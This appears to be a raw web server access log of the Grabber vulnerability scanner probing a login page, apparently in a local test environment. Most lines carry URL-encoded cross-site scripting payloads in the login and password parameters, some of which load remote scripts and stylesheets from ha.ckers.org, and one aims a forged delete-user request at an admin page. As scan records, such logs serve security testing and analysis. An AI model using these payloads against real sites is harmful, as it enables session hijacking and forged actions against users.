172.17.0.1 - - [12/Feb/2019:08:21:48 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:48 +0000] "GET /?Login=%3CA+HREF%3D%22http%3A%2F%2F0102.0146.0007.00000223%2F%22%3EXSS%3C%2FA%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:48 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:48 +0000] "GET /?Login=%3CIMG+SRC%3D%22mocha%3A%5Bcode%5D%22%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:48 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:48 +0000] "GET /?Login=%3CIMG+SRC%3D%22mocha%3A%5Bcode%5D%22%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:48 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:48 +0000] "GET /?Login=%3CIMG+SRC%3Djavascript%3Aalert%28%26quot%3BXSS%26quot%3B%29%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:48 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:48 +0000] "GET /?Login=%3CIMG+SRC%3Djavascript%3Aalert%28%26quot%3BXSS%26quot%3B%29%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:48 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:48 +0000] "GET /?Login=%3CA+HREF%3D%22http%3A%2F%2F%2577%2577%2577%252E%2567%256F%256F%2567%256C%2565%252E%2563%256F%256D%22%3EXSS%3C%2FA%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:48 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:48 +0000] "GET /?Login=%3CA+HREF%3D%22http%3A%2F%2F%2577%2577%2577%252E%2567%256F%256F%2567%256C%2565%252E%2563%256F%256D%22%3EXSS%3C%2FA%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:48 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:48 +0000] "GET /?Login=%3CSTYLE+type%3D%22text%2Fcss%22%3EBODY%7Bbackground%3Aurl%28%22javascript%3Aalert%28%27XSS%27%29%22%29%7D%3C%2FSTYLE%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:48 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:48 +0000] "GET /?Login=%3CSTYLE+type%3D%22text%2Fcss%22%3EBODY%7Bbackground%3Aurl%28%22javascript%3Aalert%28%27XSS%27%29%22%29%7D%3C%2FSTYLE%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:48 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:49 +0000] "GET /?password=%3CSTYLE%3EBODY%7B-moz-binding%3Aurl%28%22http%3A%2F%2Fha.ckers.org%2Fxssmoz.xml%23xss%22%29%7D%3C%2FSTYLE%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:49 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:49 +0000] "GET /?password=%3CSTYLE%3EBODY%7B-moz-binding%3Aurl%28%22http%3A%2F%2Fha.ckers.org%2Fxssmoz.xml%23xss%22%29%7D%3C%2FSTYLE%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:49 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:49 +0000] "GET /?password=%3COBJECT+TYPE%3D%22text%2Fx-scriptlet%22+DATA%3D%22http%3A%2F%2Fha.ckers.org%2Fscriptlet.html%22%3E%3C%2FOBJECT%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:49 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:49 +0000] "GET /?password=%3COBJECT+TYPE%3D%22text%2Fx-scriptlet%22+DATA%3D%22http%3A%2F%2Fha.ckers.org%2Fscriptlet.html%22%3E%3C%2FOBJECT%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:49 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:49 +0000] "GET /?password=%3CLINK+REL%3D%22stylesheet%22+HREF%3D%22http%3A%2F%2Fha.ckers.org%2Fxss.css%22%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:49 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:49 +0000] "GET /?password=%3CLINK+REL%3D%22stylesheet%22+HREF%3D%22http%3A%2F%2Fha.ckers.org%2Fxss.css%22%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:49 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:49 +0000] "GET /?password=%3CMETA+HTTP-EQUIV%3D%22Link%22+Content%3D%22%3Chttp%3A%2F%2Fha.ckers.org%2Fxss.css%3E%3B+REL%3Dstylesheet%22%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:49 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:49 +0000] "GET /?password=%3CMETA+HTTP-EQUIV%3D%22Link%22+Content%3D%22%3Chttp%3A%2F%2Fha.ckers.org%2Fxss.css%3E%3B+REL%3Dstylesheet%22%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:49 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:49 +0000] "GET /?password=%3CSTYLE%3E%40import%27http%3A%2F%2Fha.ckers.org%2Fxss.css%27%3B%3C%2FSTYLE%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:49 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:49 +0000] "GET /?password=%3CSTYLE%3E%40import%27http%3A%2F%2Fha.ckers.org%2Fxss.css%27%3B%3C%2FSTYLE%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:49 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:49 +0000] "GET /?password=%3CEMBED+SRC%3D%22http%3A%2F%2Fha.ckers.org%2Fxss.swf%22+AllowScriptAccess%3D%22always%22%3E%3C%2FEMBED%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:49 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:49 +0000] "GET /?password=%3CEMBED+SRC%3D%22http%3A%2F%2Fha.ckers.org%2Fxss.swf%22+AllowScriptAccess%3D%22always%22%3E%3C%2FEMBED%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:49 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:49 +0000] "GET /?password=exp%2F%2A%3CXSS+STYLE%3D%27no%5Cxss%3Anoxss%28%22%2A%2F%2F%2A%22%29%3B+xss%3A%26%23101%3Bx%26%23x2F%3B%2AXSS%2A%2F%2F%2A%2F%2A%2Fpression%28alert%28%22XSS%22%29%29%27%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:49 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:49 +0000] "GET /?password=exp%2F%2A%3CXSS+STYLE%3D%27no%5Cxss%3Anoxss%28%22%2A%2F%2F%2A%22%29%3B+xss%3A%26%23101%3Bx%26%23x2F%3B%2AXSS%2A%2F%2F%2A%2F%2A%2Fpression%28alert%28%22XSS%22%29%29%27%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:49 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:49 +0000] "GET /?password=%25BCscript%25BEalert%28%25A2XSS%25A2%29%25BC%2Fscript%25BE HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:49 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:49 +0000] "GET /?password=%25BCscript%25BEalert%28%25A2XSS%25A2%29%25BC%2Fscript%25BE HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:49 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:49 +0000] "GET /?password=%3CSCRIPT+SRC%3D%2F%2Fha.ckers.org%2F.j%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:49 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:49 +0000] "GET /?password=%3CSCRIPT+SRC%3D%2F%2Fha.ckers.org%2F.j%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:49 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:49 +0000] "GET /?password=%3CXSS+STYLE%3D%22behavior%3A+url%28http%3A%2F%2Fha.ckers.org%2Fxss.htc%29%3B%22%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:49 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:49 +0000] "GET /?password=%3CXSS+STYLE%3D%22behavior%3A+url%28http%3A%2F%2Fha.ckers.org%2Fxss.htc%29%3B%22%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:49 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:49 +0000] "GET /?password=%3CIMG+STYLE%3D%22xss%3Aexpr%2F%2AXSS%2A%2Fession%28alert%28%27XSS%27%29%29%22%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:49 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:49 +0000] "GET /?password=%3CIMG+STYLE%3D%22xss%3Aexpr%2F%2AXSS%2A%2Fession%28alert%28%27XSS%27%29%29%22%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:49 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:49 +0000] "GET /?password=%3CIMG+SRC%3D%22livescript%3A%5Bcode%5D%22%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:49 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:49 +0000] "GET /?password=%3CIMG+SRC%3D%22livescript%3A%5Bcode%5D%22%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:49 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:49 +0000] "GET /?password=%3CFRAMESET%3E%3CFRAME+SRC%3D%22javascript%3Aalert%28%27XSS%27%29%3B%22%3E%3C%2FFRAMESET%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:49 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:49 +0000] "GET /?password=%3CFRAMESET%3E%3CFRAME+SRC%3D%22javascript%3Aalert%28%27XSS%27%29%3B%22%3E%3C%2FFRAMESET%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:49 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:49 +0000] "GET /?password=%3CBR+SIZE%3D%22%26%7Balert%28%27XSS%27%29%7D%22%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:49 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:49 +0000] "GET /?password=%3CBR+SIZE%3D%22%26%7Balert%28%27XSS%27%29%7D%22%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:49 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:49 +0000] "GET /?password=Redirect+302+%2Fa.jpg+http%3A%2F%2Fvictimsite.com%2Fadmin.asp%26deleteuser HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:49 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:49 +0000] "GET /?password=Redirect+302+%2Fa.jpg+http%3A%2F%2Fvictimsite.com%2Fadmin.asp%26deleteuser HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:49 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:50 +0000] "GET /?password=%3CA+HREF%3D%22http%3A%2F%2F0x42.0x0000066.0x7.0x93%2F%22%3EXSS%3C%2FA%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:50 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:50 +0000] "GET /?password=%3CA+HREF%3D%22http%3A%2F%2F0x42.0x0000066.0x7.0x93%2F%22%3EXSS%3C%2FA%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:50 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:50 +0000] "GET /?password=%3CIMG+SRC%3D%22http%3A%2F%2Fwww.thesiteyouareon.com%2Fsomecommand.php%3Fsomevariables%3Dmaliciouscode%22%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:50 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:50 +0000] "GET /?password=%3CIMG+SRC%3D%22http%3A%2F%2Fwww.thesiteyouareon.com%2Fsomecommand.php%3Fsomevariables%3Dmaliciouscode%22%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:50 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:50 +0000] "GET /?password=%3CDIV+STYLE%3D%22width%3A+expression%28alert%28%27XSS%27%29%29%3B%22%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:50 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:50 +0000] "GET /?password=%3CDIV+STYLE%3D%22width%3A+expression%28alert%28%27XSS%27%29%29%3B%22%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:50 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:50 +0000] "GET /?password=%3CIMG+SRC%3D%22javascript%3Aalert%28%27XSS%27%29%3B%22%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:50 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:50 +0000] "GET /?password=%3CIMG+SRC%3D%22javascript%3Aalert%28%27XSS%27%29%3B%22%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:50 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:50 +0000] "GET /?password=%3CA+HREF%3D%22javascript%3Adocument.location%3D%27http%3A%2F%2Fwww.google.com%2F%27%22%3EXSS%3C%2FA%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:50 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:50 +0000] "GET /?password=%3CA+HREF%3D%22javascript%3Adocument.location%3D%27http%3A%2F%2Fwww.google.com%2F%27%22%3EXSS%3C%2FA%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:50 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:50 +0000] "GET /?password=%3CBASE+HREF%3D%22javascript%3Aalert%28%27XSS%27%29%3B%2F%2F%22%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:50 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:50 +0000] "GET /?password=%3CBASE+HREF%3D%22javascript%3Aalert%28%27XSS%27%29%3B%2F%2F%22%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:50 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:50 +0000] "GET /?password=%3CIMG+SRC%3D%27vbscript%3Amsgbox%28%22XSS%22%29%27%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:50 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:50 +0000] "GET /?password=%3CIMG+SRC%3D%27vbscript%3Amsgbox%28%22XSS%22%29%27%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:50 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:50 +0000] "GET /?password=%3CIMG+SRC%3DJaVaScRiPt%3Aalert%28%27XSS%27%29%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:50 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:50 +0000] "GET /?password=%3CIMG+SRC%3DJaVaScRiPt%3Aalert%28%27XSS%27%29%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:50 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:50 +0000] "GET /?password=%3CIMG+SRC%3D%26%230000106%26%230000097%26%230000118%26%230000097%26%230000115%26%230000099%26%230000114%26%230000105%26%230000112%26%230000116%26%230000058%26%230000097%26%230000108%26%230000101%26%230000114%26%230000116%26%230000040%26%230000039%26%230000088%26%230000083%26%230000083%26%230000039%26%230000041%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:50 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
